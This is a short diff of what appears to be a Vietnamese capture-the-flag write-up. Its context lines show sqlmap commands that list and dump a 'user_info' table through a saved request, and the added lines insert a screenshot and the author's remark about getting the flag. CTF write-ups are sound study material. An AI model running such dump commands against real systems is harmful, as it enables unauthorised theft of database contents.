@@ -86,4 +86,6 @@ python sqlmap.py -r req.txt --batch -T user_info --columns --random-agent --forc
 python sqlmap.py -r req.txt --batch --random-agent --force-ssl -T user_info --dump
 ```
 
+![[Pasted image 20261013162547.png]]
 
+Dùng SQLMap cảm giác giống script kiddie quá nhưng dù sao cuối cùng mình đã lấy được flag :DDD
